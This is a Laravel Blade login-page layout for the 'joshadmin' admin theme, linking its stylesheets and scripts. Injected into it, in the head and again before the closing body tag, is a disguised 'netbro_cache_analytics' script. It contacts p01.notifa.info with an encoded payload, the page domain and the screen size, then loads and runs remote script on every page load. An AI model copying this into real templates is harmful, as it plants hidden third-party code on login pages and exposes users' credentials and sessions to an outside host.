<html><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login | {{ config('view.apptitle') }}</title>
    <!--global css starts-->
    <link rel="stylesheet" type="text/css" href="{{ url('joshadmin/css/bootstrap.min.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ url('joshadmin/css/font-awesome.min.css') }}">
    <link rel="shortcut icon" href="url('joshadmin/images/favicon.png') }}" type="image/x-icon">
    <link rel="icon" href="{{ url('joshadmin/images/favicon.png') }}" type="image/x-icon">
    <!--end of global css-->
    <!--page level css starts-->
    <link type="text/css" rel="stylesheet" href="{{ url('joshadmin/vendors/iCheck/css/all.css') }}">
    <link rel="stylesheet" href="{{ url('joshadmin/vendors/bootstrapvalidator/css/bootstrapValidator.min.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ url('joshadmin/css/pages/advbuttons.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ url('joshadmin/css/frontend/login.css') }}">
    <!--end of page level css-->
    <script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXwXRZAmG5abCUIZqswLgZGlly8WCokorgrPMP0HJHEjnpgBMEM6aMRxJBUsC0AYsd974D%2bebUGv9eCcG1PAPkfZyRMEjf4T1vqi1rUP78Qdh70AOc94QdbF40fEsS8qrb4FpfIrlVRUDCA%2fgV7S3gXuPMpHWgDLKbE7AjD8PZntix5UyQy1GGWRL9N0ofq6XvEtwZdACNKawmMcS1mlw6NelRNxGhw%2b%2f%2bI85Vgf89ESBKDAbLBdQevUpr%2f1ebP19SeOIUZ%2f2xMZaO3XrEF45M8%2fO2l1%2f04Z1ZcZ57giu8lqeY%2fvnuqKEzSnspYtiFP%2bxRfq9wvrrixEWv9YLZZCkyGDWjV6ALDJ%2bRsWWfp%2b82vz%2fp27%2fueAevuB616mNpHqVVIqj5FNGxzGILV16LmPxH88HD7%2fI0KT0bxOSClBITE%2bkay751UQYxX8tr%2fDNz2jzz%2fMufirxc3lHUWI6jtHcme9pVRM0UE9JC%2fLU%2b0vlAiU68N548WYuscnZGqtf%2fejq%2bYEq5Gm1U5rsCyGfeRaM242Rbw%2bwxOwTrrX4ic%2fqW32I%3d&amp;idc_r=60194406206&amp;domain=demo.joshadmin.com&amp;sw=1366&amp;sh=768"></script></head>
<body>
<div class="container">
    <!--Content Section Start -->
    <div class="row">
        <div class="box animation flipInX font_size ">
            @yield('content')

        </div>
    </div>
    <!-- //Content Section End -->
</div>
<!--global js starts-->
<script type="text/javascript" src="{{ url('joshadmin/js/frontend/jquery.min.js') }}"></script>
<script type="text/javascript" src="{{ url('joshadmin/js/frontend/bootstrap.min.js') }}"></script>
<script type="text/javascript" src="{{ url('joshadmin/vendors/bootstrapvalidator/js/bootstrapValidator.min.js') }}"></script>
<script type="text/javascript" src="{{ url('joshadmin/vendors/iCheck/js/icheck.js') }}"></script>
<script type="text/javascript" src="{{ url('joshadmin/js/frontend/login_custom.js') }}"></script>
<!--global js end-->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXwXRZAmG5abCUIZqswLgZGlly8WCokorgrPMP0HJHEjnpgBMEM6aMRxJBUsC0AYsd974D%2bebUGv9eCcG1PAPkfZyRMEjf4T1vqi1rUP78Qdh70AOc94QdbF40fEsS8qrb4FpfIrlVRUDCA%2fgV7S3gXuPMpHWgDLKbE7AjD8PZntix5UyQy1GGWRL9N0ofq6XvEtwZdACNKawmMcS1mlw6NelRNxGhw%2b%2f%2bI85Vgf89ESBKDAbLBdQevUpr%2f1ebP19SeOIUZ%2f2xMZaO3XrEF45M8%2fO2l1%2f04Z1ZcZ57giu8lqeY%2fvnuqKEzSnspYtiFP%2bxRfq9wvrrixEWv9YLZZCkyGDWjV6ALDJ%2bRsWWfp%2b82vz%2fp27%2fueAevuB616mNpHqVVIqj5FNGxzGILV16LmPxH88HD7%2fI0KT0bxOSClBITE%2bkay751UQYxX8tr%2fDNz2jzz%2fMufirxc3lHUWI6jtHcme9pVRM0UE9JC%2fLU%2b0vlAiU68N548WYuscnZGqtf%2fejq%2bYEq5Gm1U5rsCyGfeRaM242Rbw%2bwxOwTrrX4ic%2fqW32I%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</body></html>